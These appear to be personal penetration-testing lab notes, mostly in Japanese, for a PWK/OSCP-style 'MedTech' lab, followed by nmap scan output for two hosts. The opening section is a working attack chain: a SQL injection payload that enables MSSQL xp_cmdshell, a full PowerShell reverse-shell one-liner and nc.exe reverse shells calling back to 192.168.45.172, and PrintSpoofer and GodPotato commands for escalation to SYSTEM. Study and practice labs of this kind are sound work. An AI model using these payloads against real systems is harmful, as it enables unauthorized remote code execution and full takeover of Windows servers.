121の80ポートが開いてるのでwebサイトを見る
loginフォームにSQLiがありそう

MSSQLのようなのでRCEを実行
input SQLi in username form
```
' EXECUTE sp_configure 'show advanced options', 1; ' RECONFIGURE; ' EXECUTE sp_configure 'xp_cmdshell', 1; ' RECONFIGURE; -- -
```
then get the revshell
```
' EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.172'',2223);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- -
```

revshellがこれだけだと怖いので、何個か張っておく
```
Start-Process "C:\Tools\nc.exe" -ArgumentList "192.168.45.172 1111 -e cmd.exe"
```

printspooferを試す
```
.\PrintSpoofer.exe -i -c cmd
```

SeImpersonateが取れているので、GodPotatoをしてSYSTEM権限に昇格
```
.\GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.172 5555"
```



# 192.168.x.120
```
Open 192.168.236.120:22
Open 192.168.236.120:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkLNDFG9Ksbp5P6tGeMkTaAWEz2kRFfmnXuClhYdhdUw7F+b/usqfzszEQFdRP3R3vpy3LnLrkDmaMuIAL/lazj55FsrhC3cnbNgNCEzapQNf0ZpAydfT4ypFiSrqLDE0Bq+xZmAT9S8eZ2efR5sfCPw9NB/hMlmW6s91xekPtBbINNhgPy8beAvkyfSlGMWj8kHKqP6onEoo+J5IkOjMcnXh+zLdxoPdo6HnuQ/VMims8qYEaxxJndN1Y46jEMdBtznbUavHrD8NIbviVFUBIfHyUEs5kWp1LK1TMSGBA9ILxGumIJRXdIV3OouR+KLlva+DxJdri9pSZ4g5TVP7iutPogBm8U7h14MfXt+jhT+NC8xRZi/30zQOtHmV+nsKzhbCmveRed3UZvcLE+t5nYuo8+EV1vqaRtvhds188FbDif1AI9ISdytjPaOomUEcRg63jUuc32iokqFLNcYba7339M8Q18HzneLXj7NGo+/avQ4D/zZVXSDki9BT+Hhs=
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1H0xp5zQUrhCWusjcxvbE4BrHOhMzFjCtti37V8JXBwBvi6uM7mmuwfkTr5eImaQsg+Py3ZA4rejeFoVgIITE=
|   256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILG7AuVkWzcrlnj9+BnFPawjXQbi/iHkE80UL/RPXFUf
80/tcp open  http    syn-ack ttl 61 WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
|_http-title: PAW! (PWK Awesome Website)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/4%OT=22%CT=%CU=40971%PV=Y%DS=4%DC=T%G=N%TM=6890AEE1%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11N
OS:W7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)
```

# 192.168.x.121
```
Open 192.168.236.121:80
Open 192.168.236.121:135
Open 192.168.236.121:139
Open 192.168.236.121:445
Open 192.168.236.121:5985
Open 192.168.236.121:47001
Open 192.168.236.121:49664
Open 192.168.236.121:49665
Open 192.168.236.121:49666
Open 192.168.236.121:49667
Open 192.168.236.121:49668
Open 192.168.236.121:49669
Open 192.168.236.121:49670
Open 192.168.236.121:49671

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MedTech
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 10 1703 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/4%OT=80%CT=%CU=42375%PV=Y%DS=4%DC=T%G=N%TM=6890AF2A%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=A)
SEQ(SP=FA%GCD=1%ISR=111%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)
```

# 192.168.x.122
```

```